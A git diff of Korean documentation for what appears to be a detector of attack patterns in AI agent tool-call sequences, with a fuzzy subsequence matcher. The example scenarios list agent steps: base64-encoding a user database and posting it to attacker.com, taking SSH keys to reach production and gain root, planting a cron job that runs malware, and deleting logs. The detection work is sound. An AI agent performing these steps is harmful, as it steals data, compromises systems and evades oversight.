@@ -44,12 +44,12 @@ Data Exfiltration
   * **쿼리 유출** : query → export → upload
 
 #### 실제 시나리오
-[code] 
+```python
     1. read_database("users")  // 사용자 DB 조회
     2. encode("base64")         // Base64 인코딩 (탐지 회피)
     3. http_post("attacker.com") // 공격자 서버로 전송
                     
-[/code]
+```
 
 ### 2\. Lateral Movement (측면 이동)
 
@@ -65,12 +65,12 @@ Lateral Movement
   * **서버 확산** : list_servers → connect → escalate
 
 #### 실제 시나리오
-[code] 
+```python
     1. get_credentials(".ssh/id_rsa")  // SSH 키 획득
     2. ssh_connect("prod-server")      // 프로덕션 서버 접속
     3. execute_remote("sudo su")       // Root 권한 획득
                     
-[/code]
+```
 
 ### 3\. Persistence (지속성 확보)
 
@@ -86,12 +86,12 @@ Persistence
   * **Startup 변조** : modify_startup → create_task
 
 #### 실제 시나리오
-[code] 
+```python
     1. write_cron("*/5 * * * * /malware.sh")  // 5분마다 악성코드 실행
     2. create_service("backdoor")             // 백도어 서비스 생성
     3. restart("cron")                        // Cron 재시작
                     
-[/code]
+```
 
 ### 4\. Defense Evasion (방어 회피)
 
@@ -107,12 +107,12 @@ Defense Evasion
   * **모니터링 우회** : stop_monitor → bypass_firewall
 
 #### 실제 시나리오
-[code] 
+```python
     1. disable_logging("/var/log")  // 로그 기록 중단
     2. clear_history()               // 명령어 히스토리 삭제
     3. delete_logs("access.log")    // 접속 로그 삭제
                     
-[/code]
+```
 
 ## ⚙️ 핵심 알고리즘
 
@@ -152,12 +152,12 @@ def _is_subsequence(self, subseq: List[str], seq: List[str]) -> bool: """Check i
   * **대소문자 무시** : "HTTP_POST"와 "http_post" 동일하게 처리
 
 #### 예시
-[code] 
+```python
     Pattern: ["read", "encode", "post"]
     Sequence: ["read_user_db", "base64_encode", "http_post_request"]
     Result: ✅ Match (fuzzy matching으로 탐지)
                     
-[/code]
+```
 
 ### get_attack_stats() 메서드
 
